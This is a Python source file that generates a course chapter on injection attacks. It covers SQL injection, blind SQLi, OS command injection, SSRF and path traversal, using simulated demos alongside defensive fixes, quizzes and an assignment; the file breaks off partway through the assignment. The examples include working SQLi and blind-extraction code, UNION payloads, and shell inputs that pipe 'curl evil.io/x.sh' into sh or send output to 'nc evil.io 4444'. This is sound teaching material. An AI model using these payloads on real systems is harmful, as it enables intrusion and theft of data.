# Application Security 1.2: injection. Checked against rain.forest.puppy, NT Web Technology Vulnerabilities (Phrack
# 54, 1998), the OWASP SQL Injection, Query Parameterization, OS Command Injection, SSRF and Path Traversal cheat
# sheets, MITRE CWE-89, CWE-78, CWE-918 and CWE-22, the SQLite documentation, the Python subprocess, shlex and
# ipaddress documentation, US DOJ filings on Heartland (2009) and Capital One (2019), the UK ICO TalkTalk penalty
# notice (2016), NVD entries for CVE-2014-6271 and CVE-2021-41773, and AWS documentation on IMDSv2.
from cvkit import Kit, fx, fxs, ladder, scene, note, deep, table, steps, viz, eq
from coreaikit import wwh, versus, recap, src
from pykit import chapter, run, local, files, grow, show, term
from cykit import talk, safe, attack

chapter('cy-injection')
K = Kit()

K.code('sqli_demo', r'''
# SQL injection on an in-memory SQLite database, and the fix: parameterised queries
import sqlite3

db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE users (id INTEGER, name TEXT, password_hash TEXT, role TEXT);
INSERT INTO users VALUES (1, 'alice', 'h_7f3a', 'admin'), (2, 'bob', 'h_91cc', 'user');
CREATE TABLE cards (owner TEXT, number TEXT);
INSERT INTO cards VALUES ('alice', '4111-1111-1111-1111'), ('bob', '5500-0000-0000-0004');
""")

def login_buggy(name, pw_hash):
    sql = f"SELECT name, role FROM users WHERE name = '{name}' AND password_hash = '{pw_hash}'"
    print("   SQL:", sql)
    return db.execute(sql).fetchall()

def login_safe(name, pw_hash):
    sql = "SELECT name, role FROM users WHERE name = ? AND password_hash = ?"
    return db.execute(sql, (name, pw_hash)).fetchall()      # data is sent apart from the query

print("1. normal login:")
print("  ", login_buggy("bob", "h_91cc"))
print("2. attacker types  alice' --  as the user name and anything as the password:")
print("  ", login_buggy("alice' --", "x"), " <- logged in as admin without a password")
print("3. attacker types  ' OR '1'='1  in both boxes:")
print("  ", login_buggy("' OR '1'='1", "' OR '1'='1"), " <- every row")

def search_buggy(term):
    sql = f"SELECT name FROM users WHERE name LIKE '%{term}%'"
    return db.execute(sql).fetchall()

print("4. UNION attack on a search box reads another table:")
print("  ", search_buggy("zzz' UNION SELECT owner || ': ' || number FROM cards --"))
print("5. the same inputs against the parameterised version:")
print("  ", login_safe("alice' --", "x"), login_safe("' OR '1'='1", "' OR '1'='1"), "<- treated as plain text, no match")
''', long=True)

K.code('blind_sqli', r'''
# Blind SQL injection: the page only says "found" or "not found", yet a secret leaks one character at a time.
# Binary search on character codes needs about log2(95) = 6.6 questions per printable character.
import math, sqlite3

db = sqlite3.connect(":memory:")
db.executescript("CREATE TABLE users (name TEXT, token TEXT); INSERT INTO users VALUES ('admin', 'K9#qz');")
questions = 0

def page_says_found(injected):                    # the only thing the attacker sees: True or False
    global questions
    questions += 1
    sql = f"SELECT 1 FROM users WHERE name = 'nobody' OR ({injected})"
    return bool(db.execute(sql).fetchall())

def leak_char(pos):
    lo, hi = 32, 126                              # printable ASCII
    while lo < hi:
        mid = (lo + hi) // 2
        if page_says_found(f"unicode(substr((SELECT token FROM users WHERE name='admin'), {pos}, 1)) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

length = next(n for n in range(1, 50) if page_says_found(f"length((SELECT token FROM users WHERE name='admin')) = {n}"))
print("token length found after", questions, "questions:", length)
secret = ""
for pos in range(1, length + 1):
    secret += leak_char(pos)
    print(f"after {questions:3} questions: {secret}")
print(f"binary search: about {math.ceil(math.log2(95))} questions per character, linear guessing up to 95")
''', long=True)

K.code('command_injection', r'''
# OS command injection: why building a shell command from user input is dangerous. Nothing is executed here,
# the program only shows how a shell would split the text into commands.
import ipaddress, shlex

def as_shell_sees_it(command_text):
    lexer = shlex.shlex(command_text, posix=True, punctuation_chars=";&|")
    commands, current = [], []
    for token in lexer:
        if token in (";", "&&", "||", "|", "&"):
            commands.append(current); current = []
        else:
            current.append(token)
    commands.append(current)
    return [c for c in commands if c]

for user_input in ["8.8.8.8", "8.8.8.8; cat /etc/passwd", "8.8.8.8 && curl evil.io/x.sh | sh"]:
    text = "ping -c 1 " + user_input                       # the bug: string concatenation into a shell
    print(f"input {user_input!r}")
    for i, cmd in enumerate(as_shell_sees_it(text), 1):
        print(f"   command {i}: {cmd}")

# Fix 1: validate strictly against what you expect (an IP address)
def valid_ip(text):
    try:
        ipaddress.ip_address(text)
        return True
    except ValueError:
        return False

# Fix 2: pass an argument list and never use a shell: subprocess.run(["ping", "-c", "1", ip], shell=False)
for user_input in ["8.8.8.8", "8.8.8.8; cat /etc/passwd"]:
    if valid_ip(user_input):
        print("safe argument list:", ["ping", "-c", "1", user_input])
    else:
        print("rejected:", repr(user_input))
print("if a shell is unavoidable, quote:", "ping -c 1 " + shlex.quote("8.8.8.8; cat /etc/passwd"))
''', long=True)

K.code('ssrf_guard', r'''
# Server side request forgery (SSRF): a "fetch this URL for me" feature can be aimed at internal addresses,
# such as the cloud metadata service at 169.254.169.254. DNS is a dictionary here, nothing is fetched.
import ipaddress
from urllib.parse import urlsplit

FAKE_DNS = {"images.example.org": "93.184.216.34", "internal.corp": "10.0.0.12", "sneaky.example.net": "127.0.0.1"}

def resolve(host):
    try:
        return ipaddress.ip_address(host)              # already an address (also handles IPv6)
    except ValueError:
        pass
    if host.isdigit():                                 # browsers and libraries accept 2130706433 for 127.0.0.1
        return ipaddress.ip_address(int(host))
    return ipaddress.ip_address(FAKE_DNS.get(host, "0.0.0.0"))

def allowed(url):
    u = urlsplit(url)
    if u.scheme not in ("http", "https"):
        return False, "scheme " + u.scheme
    ip = resolve(u.hostname)
    if ip.version == 6 and ip.ipv4_mapped:             # ::ffff:127.0.0.1 is really 127.0.0.1
        ip = ip.ipv4_mapped
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_unspecified or ip.is_reserved:
        return False, f"{ip} is internal"
    return True, str(ip)

urls = [
    "https://images.example.org/cat.png",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://internal.corp/admin",
    "http://sneaky.example.net/",                       # public name, private address
    "http://2130706433/",                               # 127.0.0.1 written as one number
    "http://[::ffff:127.0.0.1]/",
    "file:///etc/passwd",
]
for url in urls:
    ok, why = allowed(url)
    print(f"{'ALLOW' if ok else 'BLOCK'}  {url:66} {why}")
print("Also: connect to the address you checked (not a fresh lookup), and do not follow redirects blindly.")
''', long=True)

K.code('path_traversal', r'''
# Path traversal: "../" in a file name escapes the folder the app meant to serve
import posixpath

BASE = "/srv/app/uploads"

def open_buggy(name):
    return posixpath.join(BASE, name)                   # just glues the strings together

def open_safe(name):
    full = posixpath.normpath(posixpath.join(BASE, name))
    if posixpath.commonpath([full, BASE]) != BASE:      # must still be inside BASE after resolving ".."
        return None
    return full

for name in ["report.pdf", "../../../etc/passwd", "photos/../report.pdf", "/etc/shadow", "photos/../../../app/secret.key"]:
    print(f"{name:32} buggy -> {posixpath.normpath(open_buggy(name)):28} safe -> {open_safe(name)}")
''', long=True)

K.lesson('idea', 'Injection: when data is read as code', f'''
{talk('Injection is one idea behind many attacks. A program builds a command in some language, SQL for a database, shell for the operating system, a file path, a URL, an LDAP query or a template, and it pastes user input into that command. If the input contains characters that mean something in that language, such as a quote, a semicolon or two dots, the input stops being data and becomes part of the command. The first public write up of SQL injection was by Jeff Forristal, writing as rain.forest.puppy, in the hacker magazine Phrack in December 1998. Since then injection has caused some of the largest breaches on record. Albert Gonzalez and his group used SQL injection to get into Heartland Payment Systems and steal about 130 million card numbers in 2008, and he was sentenced to 20 years in prison. In 2015 teenagers used SQL injection on the UK telecom TalkTalk and took data on about 157000 customers, and the regulator fined the company 400000 pounds. In 2023 the Cl0p group used a SQL injection in the MOVEit file transfer product to steal data from thousands of organisations. Injection was number one in the OWASP Top 10 from 2010 to 2017, third in 2021 and fifth in 2025, so it is falling as frameworks make the safe way the default. The cure is always the same principle: keep code and data apart, using an interface that cannot confuse them, such as a parameterised query or an argument list.')}
{src('rain.forest.puppy (Jeff Forristal), NT Web Technology Vulnerabilities, Phrack 54 (1998), OWASP SQL Injection Prevention, Query Parameterization, OS Command Injection Defense, SSRF Prevention and Path Traversal pages, MITRE CWE-89, CWE-78, CWE-918, CWE-22, CWE-502, US DOJ press releases on Albert Gonzalez (2009 and 2010) and Paige Thompson (2019 and 2022), UK ICO penalty notice to TalkTalk (2016), NVD CVE-2014-6271 (Shellshock), CVE-2021-41773 (Apache path traversal), CVE-2023-34362 (MOVEit), AWS documentation on IMDSv2 (2019), Python documentation for sqlite3, subprocess, shlex and ipaddress.')}
{safe('All databases, shells and networks on this page are simulations inside Python: an in memory SQLite database, a text splitter that shows what a shell would do, and a dictionary instead of DNS. Practise on DVWA, OWASP Juice Shop or PortSwigger Web Security Academy labs, never on real sites.')}
{wwh('<b>Injection</b> happens when untrusted input is put into a command, query or path in a way that lets the input change the command’s structure instead of only filling in a value.',
     'An injection often gives the attacker the full power of the interpreter behind the app: every row of the database, any shell command, any file, or any address the server can reach.',
     'Never build commands by string concatenation. Use parameterised queries, argument lists without a shell, allow lists of expected values, path checks after normalising, and address checks after resolving. Run with least privilege so a mistake is contained.')}
{table(['Injection type', 'Interpreter', 'Dangerous characters', 'Main fix', 'CWE'], [
    ['SQL injection', 'Database', "<code>' \" ; -- /* */</code>", 'Parameterised queries', 'CWE-89'],
    ['OS command injection', 'Shell', '<code>; &amp; | ` $( )</code> and newline', 'Argument list, no shell, allow lists', 'CWE-78'],
    ['Path traversal', 'File system', '../ and absolute paths', 'Normalise then check the base folder', 'CWE-22'],
    ['SSRF', 'The server’s own HTTP client', 'Internal hosts, odd IP forms, redirects', 'Resolve and block internal ranges, allow lists', 'CWE-918'],
    ['XSS (next chapter)', 'The browser', '&lt; &gt; &quot; and javascript:', 'Context aware output encoding, CSP', 'CWE-79'],
    ['Template injection', 'Template engine', '{{{{ }}}} and engine syntax', 'Never let users write templates', 'CWE-1336'],
    ['Log4Shell style lookups', 'Logging library', '${{jndi:...}}', 'Patch, disable lookups', 'CWE-917']])}
''', kw=['injection', 'code versus data', 'SQL injection', 'command injection', 'path traversal', 'SSRF', 'template injection', 'Phrack', 'rain.forest.puppy', 'Heartland', 'Albert Gonzalez', 'TalkTalk', 'MOVEit'])

K.lesson('sqli', 'SQL injection and parameterised queries', f'''
{talk('Most web apps store their data in a relational database and talk to it in SQL. A login form might check a user like this: select the row where name equals what was typed and password hash equals what was computed. If the code builds that query by pasting the typed name between quotes, a name containing a quote ends the string early. The attacker can then add SQL of their own. Typing alice followed by a quote and two dashes logs in as alice, because the two dashes start a comment and the password check disappears. Typing a quote, OR, and a condition that is always true returns every row. With UNION, the attacker can bolt the results of a second query onto the first and read other tables, such as card numbers. On some databases stacked queries even allow deleting tables or running operating system commands. The well known xkcd comic from 2007 about a boy whose name ends with a DROP TABLE Students command made this famous outside security. The fix is the parameterised query, also called a prepared statement. The query text with placeholders is sent first and parsed, and the values are sent separately. The database already knows the shape of the query, so a quote in a value is just a character. Escaping input by hand is fragile and has been bypassed many times through character set tricks. Object relational mappers such as Django’s ORM and SQLAlchemy parameterise for you, but raw query features inside them can bring the bug back.')}
{viz('cysqli')}
{run('sqli_demo')}
{fxs(fx('Why OR 1=1 returns everything', 'WHERE a OR TRUE &equiv; TRUE', 'AND binds tighter than OR, so the injected OR makes the whole condition true for every row.', key=True),
     fx('UNION rule', 'columns(query 1) = columns(query 2)', 'Attackers first find the column count, for example with ORDER BY n until an error appears.'))}
{attack([
    ['Close the string with a quote and comment out the rest', 'Parameterised queries for every value'],
    ['UNION SELECT from other tables', 'Least privilege database user that can read only what the page needs'],
    ['Stacked queries to modify data', 'Drivers that run one statement per call, no admin rights for the app user'],
    ['Error messages that reveal table names', 'Generic error pages, detailed errors only in server logs'],
    ['Encoding tricks to beat hand written escaping', 'Do not escape by hand, and add allow lists for things like column names in ORDER BY']])}
{note('Placeholders work for values only. Table names, column names and sort directions cannot be parameters, so check them against a fixed allow list in code.')}
''', kw=['SQL injection', 'SQLi', 'parameterised query', 'prepared statement', 'UNION attack', 'tautology', 'comment injection', 'stacked queries', 'ORM', 'escaping', 'least privilege', 'Bobby Tables'])

K.lesson('blind', 'Blind SQL injection: leaking data one bit at a time', f'''
{talk('Sometimes an injectable page shows no data and no errors. It might only say found or not found, or show the same page either way. That is still enough. In boolean based blind injection, the attacker injects a condition and watches which of the two answers comes back, which is one bit of information per request. Asking whether the first character of the admin’s token has a code above 79, then above 103, and so on, is a binary search, and it finds any printable character in at most seven requests. In time based blind injection, the attacker makes the database pause, for example with SLEEP(5), only when a condition is true, and measures how long the reply takes, so even an identical page leaks information. Tools such as sqlmap, first released in 2006, automate all of this and can dump a whole database through a single vulnerable parameter. Defenders sometimes think that hiding error messages makes injection harmless. Blind injection shows it does not: the only real fix is to remove the injection itself with parameterised queries. Rate limits and web application firewalls slow the attack and raise alerts, which is useful as a second layer.')}
{viz('cyblind')}
{run('blind_sqli')}
{fxs(fx('Questions per character', 'q = &lceil;log<sub>2</sub> n&rceil;', 'n = 95 printable characters: &lceil;6.57&rceil; = 7. Bytes 0 to 255: 8.', key=True),
     fx('Questions for a secret', 'Q &asymp; L &times; &lceil;log<sub>2</sub> n&rceil; + (questions to find L)', 'A 32 character token: about 32 &times; 7 = 224 requests.', key=True),
     fx('Time based cost', 'T &asymp; Q &times; (delay &times; P(true) + normal time)', '224 questions, half of them true with a 5 s delay: about 560 s plus normal time.'))}
{deep('Information theory view', '<p>Each yes or no answer gives at most one bit. A secret with H bits of entropy needs at least H answers on average, whatever the method. A random 32 character token over 95 symbols holds 32 &times; log<sub>2</sub> 95 &asymp; 210 bits, so binary search, at 224 questions, is close to the best possible. Out of band techniques, such as making the database send a DNS lookup that carries data, can leak many bits per request.</p>')}
''', kw=['blind SQL injection', 'boolean based', 'time based', 'SLEEP', 'binary search', 'sqlmap', 'out of band', 'information leakage', 'WAF'])

K.lesson('command', 'OS command injection', f'''
{talk('Some features call operating system commands: a network tool that pings an address, an image converter, a backup script. If the code builds a command line by pasting user input into it and runs it through a shell, the shell’s special characters become weapons. A semicolon ends one command and starts another, two ampersands run a second command if the first succeeds, a pipe sends output into another program, and backticks or dollar brackets run a command and paste its output. So an address field holding 8.8.8.8 followed by a semicolon and cat /etc/passwd runs two commands. Command injection usually gives the attacker the full rights of the web server process, which is why it is rated among the most severe flaws. It also appears in surprising places. Shellshock, disclosed in September 2014 and found by Stéphane Chazelas, was a flaw in the bash shell itself: text in an environment variable that looked like a function definition could carry extra commands, and web servers passed request headers to scripts as environment variables, so a single crafted header could run commands on millions of servers. Home routers and other devices with web admin pages are full of command injection bugs, and botnets such as Mirai variants use them to spread. The defences are simple. Prefer a library function over a command. If a command is needed, pass an argument list with no shell, which in Python means subprocess.run with a list and shell=False, so no character is special. Validate input against a strict allow list, such as a real IP address.')}
{run('command_injection')}
{table(['Shell character', 'Meaning', 'Example'], [
    ['<code>;</code>', 'Run the next command after this one', '<code>8.8.8.8; id</code>'],
    ['&amp;&amp;', 'Run the next if this one succeeds', '8.8.8.8 &amp;&amp; id'],
    ['||', 'Run the next if this one fails', 'x || id'],
    ['|', 'Pipe output into another program', '8.8.8.8 | nc evil.io 4444'],
    ['`cmd` or $(cmd)', 'Run cmd and paste its output', '$(whoami)'],
    ['newline', 'Ends a command, like <code>;</code>', '8.8.8.8%0aid in a URL']])}
{versus('Three ways to run a program from Python', ['', 'os.system(text)', 'subprocess.run(text, shell=True)', 'subprocess.run([args], shell=False)'], [
    ['Uses a shell', 'Yes', 'Yes', 'No'],
    ['Special characters active', 'Yes', 'Yes', 'No, each list item is one argument'],
    ['Injection risk with user input', 'High', 'High', 'Very low (watch for arguments starting with -)'],
    ['Use it for', 'Avoid', 'Fixed commands only', 'Anything with user input']],
    'Use an argument list without a shell, and validate inputs. If a shell cannot be avoided, wrap every value with shlex.quote.')}
''', kw=['command injection', 'OS command injection', 'shell metacharacters', 'Shellshock', 'CVE-2014-6271', 'subprocess', 'shell=False', 'shlex.quote', 'allow list', 'CWE-78'])

K.lesson('ssrf', 'Server side request forgery and the cloud metadata service', f'''
{talk('Many apps fetch URLs on a user’s behalf: link previews, webhooks, importing a file from a URL, or rendering a PDF from a web page. In server side request forgery the attacker gives the server a URL that points somewhere the attacker could never reach directly, because the request now comes from inside the network. Targets include internal admin panels, databases with web interfaces, and above all the cloud metadata service. Every virtual machine in AWS, Azure and Google Cloud can ask a special address, 169.254.169.254, for information about itself, including temporary credentials for the role it runs as. In 2019 an attacker used an SSRF through a misconfigured web application firewall at Capital One to read those credentials, then used them to copy data on about 106 million people in the United States and Canada from cloud storage. She was convicted in 2022. AWS responded by releasing IMDSv2 in November 2019, which requires a PUT request to get a session token first, something a simple SSRF usually cannot send. SSRF filters are hard to get right because addresses can be written in many ways: 127.0.0.1 can also be written as 2130706433, as 0x7f000001, or as the IPv6 address ::ffff:127.0.0.1, and a public domain name can point to a private address. Some attackers use DNS rebinding, where a name resolves to a public address when checked and a private one when fetched, or redirects from an allowed site to an internal one. The robust approach is to resolve the name once, check the resulting address against blocked ranges, connect to exactly that address, refuse redirects, and where possible only allow a short list of known destinations.')}
{viz('cyssrf')}
{run('ssrf_guard')}
{table(['Address range', 'What it is', 'Why block it'], [
    ['127.0.0.0/8, ::1', 'Loopback, the server itself', 'Local admin and debug services'],
    ['10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16', 'Private networks (RFC 1918)', 'Internal services'],
    ['169.254.0.0/16', 'Link local, includes 169.254.169.254', 'Cloud metadata and credentials'],
    ['fc00::/7, fe80::/10', 'IPv6 private and link local', 'Same reasons, often forgotten'],
    ['0.0.0.0', 'Unspecified', 'Often means this host']])}
{fxs(fx('One number IPv4', 'n = a &middot; 2<sup>24</sup> + b &middot; 2<sup>16</sup> + c &middot; 2<sup>8</sup> + d', '127.0.0.1: 127 &times; 16777216 + 1 = 2130706433. Filters that match text miss it.', key=True))}
''', kw=['SSRF', 'server side request forgery', 'cloud metadata', '169.254.169.254', 'IMDSv2', 'Capital One', 'DNS rebinding', 'redirects', 'RFC 1918', 'link local', 'allow list', 'CWE-918'])

K.lesson('paths', 'Path traversal, deserialisation and template injection', f'''
{talk('Path traversal is injection into file names. An app that serves files from an uploads folder by gluing the requested name onto the folder path can be asked for dot dot slash dot dot slash etc slash passwd, and the operating system follows the dots up out of the folder. In October 2021 Apache HTTP Server 2.4.49 shipped with a path normalisation bug, CVE-2021-41773, that allowed exactly this with URL encoded dots, and attackers were exploiting it within days. The fix in code is to normalise the full path first and then check that it still lies inside the intended folder, or better, never use user input as a path at all and look files up by an id. Two related bugs belong in the same family. Insecure deserialisation happens when an app turns attacker supplied bytes back into objects with a format that can run code while loading, such as Python’s pickle or Java’s native serialisation. Loading a pickle from an untrusted source is the same as running the attacker’s program, so use JSON for untrusted data. Server side template injection happens when user input is placed into a template, for example a Jinja2 or Twig template, instead of being passed as a value to it. Template languages can call functions, so an attacker who types template syntax can often reach code execution. The lesson is the same as for SQL: user input must only ever fill a slot, never become part of the program.')}
{run('path_traversal')}
{steps('Safe file serving', [
    'Prefer an id: store files under random names and map ids to them in a database.',
    'If a name is needed, allow only a strict pattern, for example letters, digits, dash and one dot.',
    'Join with the base folder and normalise the result (resolve .. and symlinks).',
    'Check that the result is still inside the base folder.',
    'Run the app with a user that can read only that folder.'])}
{note('Python’s pickle documentation carries a warning: never unpickle data received from an untrusted or unauthenticated source. The same applies to yaml.load without SafeLoader, and to Java ObjectInputStream.')}
''', kw=['path traversal', 'directory traversal', 'dot dot slash', 'CVE-2021-41773', 'normpath', 'commonpath', 'insecure deserialisation', 'pickle', 'server side template injection', 'SSTI', 'Jinja2', 'CWE-22', 'CWE-502'])

K.lesson('versus', 'Injection defences compared', f'''
{talk('Students often list input validation as the fix for injection. It helps, but it is not the main defence, because what counts as dangerous depends on where the data goes. The main defence is to use an interface that keeps data apart from code for that particular interpreter. Validation and least privilege come next, and a web application firewall is a safety net, not a cure.')}
{versus('Defences against injection', ['', 'Parameterised API', 'Allow list validation', 'Escaping or quoting', 'WAF', 'Least privilege'], [
    ['Idea', 'Send code and data separately', 'Accept only known good input', 'Neutralise special characters', 'Block known attack patterns in traffic', 'Limit what a successful attack can do'],
    ['Strength', 'Removes the bug class', 'Strong for simple fields', 'Fragile, depends on context', 'Easily bypassed by encoding', 'Contains damage'],
    ['Example', 'cursor.execute(sql, params)', 'ipaddress.ip_address(x)', 'shlex.quote(x)', 'ModSecurity with OWASP CRS', 'App DB user without DROP rights'],
    ['Role', 'First choice', 'Add on top', 'Last resort', 'Second layer, alerting', 'Always']],
    'Parameterise first, validate second, run with least privilege always, and treat a WAF as an alarm and a speed bump.')}
''', kw=['comparison', 'input validation', 'WAF', 'ModSecurity', 'escaping', 'defence in depth'])

K.lesson('levels', 'From beginner to expert', f'''
{talk('A beginner understands that a website must never trust what people type. A college student can exploit SQL injection in a lab, write the parameterised fix, and explain blind injection with binary search. A professional finds injection in code reviews and tests, builds safe database layers and SSRF protected fetchers, and tunes WAF rules. Researchers build static analysis that tracks tainted data from input to dangerous functions, and study new injection surfaces such as prompts to large language models.')}
{ladder(
    '<p>Know that typed input can attack a program, and that a site leaking passwords or card numbers often had an injection bug.</p>',
    '<p>SQL injection with comments, tautologies and UNION, parameterised queries, blind injection by binary search, command injection and argument lists, SSRF and address checks, path traversal.</p>',
    '<p>Test with Burp Suite and sqlmap in authorised engagements, review code for sinks such as raw queries and shell=True, defend cloud apps with IMDSv2 and egress rules, and write SAST rules.</p>',
    '<p>Taint analysis and program analysis for injection, grammar based fuzzing of parsers, SSRF in complex cloud graphs, and prompt injection against LLM applications, where the same code versus data confusion appears in natural language.</p>')}
{grow('Explain why a website must not trust typed input.',
      'Exploit and fix injection bugs in lab code.',
      'Find injection at scale with tools and analysis.')}
''', kw=['beginner', 'expert', 'taint analysis', 'sqlmap', 'prompt injection', 'SAST'])

K.lesson('recap', 'Chapter summary', f'''
{recap([
    '<b>Injection</b>: input pasted into a command becomes code. First described for SQL in Phrack in 1998. Heartland, TalkTalk and MOVEit show the cost.',
    '<b>SQL injection</b>: quote plus comment, OR always true, UNION to read other tables. Fix: parameterised queries, allow lists for names, least privilege.',
    '<b>Blind injection</b>: one bit per request, binary search needs &lceil;log<sub>2</sub> 95&rceil; = 7 questions per character. Hiding errors is not a fix.',
    '<b>Command injection</b>: <code>; &amp;&amp; | $( )</code> in a shell. Fix: subprocess with a list and no shell, strict validation. Shellshock hid it inside bash.',
    '<b>SSRF</b>: the server fetches internal URLs, such as 169.254.169.254. Resolve, block internal ranges, pin the address, no redirects, IMDSv2. Capital One 2019.',
    '<b>Paths and objects</b>: normalise then check the base folder. Never unpickle untrusted data. Never let users write templates.'],
    'Next, Application Security 1.3: cross site scripting, request forgery and the content security policy.')}
{files('Three tasks: a parameterised login, binary search over a yes or no oracle, and a safe path check.')}
''', kw=['summary', 'recap'])

K.quiz('e', 'What is the root cause of every injection bug?', ['Slow servers', 'User input is pasted into a command so it can change the command itself', 'Weak passwords', 'Missing HTTPS'], 1, 'Data becomes code.', 'Keep code and data apart.')
K.quiz('e', 'The main defence against SQL injection is', ['Hiding error messages', 'Parameterised queries (prepared statements)', 'Using a long password', 'Blocking the word SELECT'], 1, 'Placeholders.', 'The database parses the query before it sees the values.')
K.quiz('e', 'In a SQL login, what does typing alice\' -- as the user name do?', ['Nothing', 'Closes the string and comments out the password check', 'Deletes alice', 'Encrypts the query'], 1, 'Comment.', '-- starts a comment in SQL.')
K.quiz('e', 'Which address is the cloud metadata service on AWS, Azure and Google Cloud?', ['8.8.8.8', '169.254.169.254', '127.0.0.1', '192.168.1.1'], 1, 'Link local.', 'It can hand out the machine’s credentials.')
K.quiz('m', 'Why is subprocess.run(["ping", "-c", "1", ip]) safer than os.system("ping -c 1 " + ip)?', ['It is faster', 'No shell is used, so <code>;</code> and <code>|</code> are ordinary characters inside one argument', 'It encrypts', 'It checks the IP'], 1, 'No shell.', 'Still validate the input.')
K.quiz('m', 'A page shows only "found" or "not found". Can it still leak a password through SQL injection?', ['No', 'Yes, by blind injection: one bit per request, binary search per character', 'Only with errors', 'Only on MySQL'], 1, 'Blind.', 'Time based variants work even without a visible difference.')
K.quiz('m', 'What must be true for a UNION SELECT injection to work?', ['The tables must be empty', 'Both queries must return the same number of columns with compatible types', 'The database must be SQLite', 'The password must be known'], 1, 'Column count.', 'Attackers probe it with ORDER BY n.')
K.quiz('m', 'Which input escapes /srv/app/uploads when joined naively?', ['report.pdf', '../../../etc/passwd', 'photos/report.pdf', 'a.txt'], 1, 'Dot dot.', 'Normalise, then check the base folder.')
K.quiz('m', 'Why is 2130706433 dangerous in an SSRF filter that blocks the text "127.0.0.1"?', ['It is a port', 'It is 127.0.0.1 written as one number, so a text filter misses it', 'It is IPv6', 'It is a domain'], 1, 'Same address.', 'Check the parsed address, not the text.')
K.quiz('h', 'What did AWS IMDSv2 change to blunt SSRF?', ['It moved the address', 'Metadata needs a session token from a PUT request first', 'It removed credentials', 'It added a password'], 1, 'Token first.', 'Simple SSRF can usually only send GET.')
K.quiz('h', 'Why are table and column names not protected by placeholders?', ['They are, always', 'Placeholders stand for values only, so identifiers must come from an allow list', 'They are encrypted', 'SQL has no identifiers'], 1, 'Values only.', 'Typical case: a user chosen ORDER BY column.')
K.quiz('h', 'What made Shellshock (2014) so widespread?', ['It was in Windows', 'Bash ran commands hidden in environment variables, and web servers put request headers in environment variables', 'It used SQL', 'It needed physical access'], 1, 'Headers to env.', 'CGI scripts on millions of servers were exposed.')
K.quiz('h', 'Loading an untrusted file with pickle.loads is risky because', ['It is slow', 'Unpickling can run arbitrary code chosen by whoever made the file', 'It loses data', 'It needs a GPU'], 1, 'Code on load.', 'Use JSON for untrusted data.')
K.quiz('x', 'In the style of a CMU 15-330 question: an SSRF filter resolves the host, checks the address, then calls a library that resolves the host again. What attack defeats it?', ['Path traversal', 'DNS rebinding: the name returns a public address for the check and a private one for the fetch', 'Clickjacking', 'Blind SQLi'], 1, 'Time of check versus time of use.', 'Connect to the exact address that was checked.')
K.quiz('x', 'In the style of an IIT Delhi COL759 exam: a time based blind injection can make the reply take 0, 2, 4 or 6 seconds. How many bits does each request leak at most?', ['1', '2', '4', '6'], 1, 'log<sub>2</sub> 4.', 'Four distinguishable outcomes give 2 bits.')

K.calc('e', 'How many yes or no questions does binary search need for one byte (256 values)?', '8', 'log<sub>2</sub> 256.', ['Each answer halves the range.', '256 = 2<sup>8</sup>.', eq('8 questions')], check=8)
K.calc('e', 'Write 127.0.0.1 as one 32 bit number.', '2130706433', 'Powers of 256.', ['127 &times; 2<sup>24</sup> = 2130706432.', 'Add 0 + 0 + 1.', eq('2130706433')], check=127 * 2 ** 24 + 1)
K.calc('e', 'At most how many questions per printable character (95 values)?', '7', 'Round log<sub>2</sub> 95 up.', ['log<sub>2</sub> 95 = 6.57.', 'Round up.', eq('7')], check=7)
K.calc('m', 'About how many requests to leak a 32 character token at 7 per character?', '224', 'Multiply.', ['32 characters.', '7 questions each.', eq('32 &times; 7 = 224')], check=224)
K.calc('m', 'Write 10.0.0.12 as one 32 bit number.', '167772172', '10 &times; 2<sup>24</sup> + 12.', ['10 &times; 16777216 = 167772160.', 'Add 12.', eq('167772172')], check=10 * 2 ** 24 + 12)
K.calc('m', 'A time based attack asks 224 questions. Half are true and wait 5 s each. Total delay in seconds?', '560', '112 true answers.', ['224 / 2 = 112 true.', '112 &times; 5.', eq('560 s')], check=560)
K.calc('m', 'Entropy in bits of a random 32 character token over 95 symbols? Round to a whole number.', '210', '32 log<sub>2</sub> 95.', ['log<sub>2</sub> 95 = 6.570.', '32 &times; 6.570 = 210.2.', eq('210 bits')], check=210)
K.calc('m', 'A token is 16 hex characters. Questions to leak it by binary search?', '64', '4 per hex character.', ['16 values per character.', 'log<sub>2</sub> 16 = 4.', eq('16 &times; 4 = 64')], check=64)
K.calc('h', 'How many addresses are in 10.0.0.0/8?', '16777216', '2<sup>32&minus;8</sup>.', ['8 bits fixed.', '24 bits free.', eq('2<sup>24</sup> = 16777216')], check=2 ** 24)
K.calc('h', 'How many addresses are in 172.16.0.0/12?', '1048576', '2<sup>20</sup>.', ['12 bits fixed.', '20 bits free.', eq('2<sup>20</sup> = 1048576')], check=2 ** 20)
K.calc('h', 'A rate limit allows 1 request per second. Minutes to send 224 blind injection requests? Round to 2 decimals.', '3.73', 'Divide by 60.', ['224 seconds.', '224 / 60.', eq('3.73 minutes')], check=round(224 / 60, 2))
K.calc('h', 'What fraction of all IPv4 addresses are RFC 1918 private? Round to 4 decimals.', '0.0042', 'Add the three blocks.', ['2<sup>24</sup> + 2<sup>20</sup> + 2<sup>16</sup> = 17891328.', 'Divide by 2<sup>32</sup> = 4294967296.', eq('0.0042')], check=round((2 ** 24 + 2 ** 20 + 2 ** 16) / 2 ** 32, 4))
K.calc('x', 'With 4 distinguishable delays (2 bits per request), how many requests to leak 210 bits?', '105', '210 / 2.', ['Each request gives 2 bits.', '210 / 2.', eq('105 requests')], check=105)
K.calc('x', 'Guessing a uniformly random printable character one value at a time, what is the expected number of guesses?', '48', '(n + 1) / 2.', ['Equally likely to be at any of 95 positions.', 'Mean position = (95 + 1) / 2.', eq('48, against at most 7 for binary search')], check=48)

K.assign('safe_login', 'e', 'A parameterised login',
         '<p>The starter creates an in memory SQLite table <code>users(name, pw)</code>. Write <code>safe_login(name, pw)</code> that returns True if a row matches both values and False otherwise, using a query with <code>?</code> placeholders. The injection attempts in the tests must fail.</p>',
         '''
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (name TEXT, pw TEXT)")
db.execute("INSERT INTO users VALUES ('alice', 'h_7f3a'), ('bob', 'h_91cc')")

def safe_login(name, pw):
    # your code here
    pass
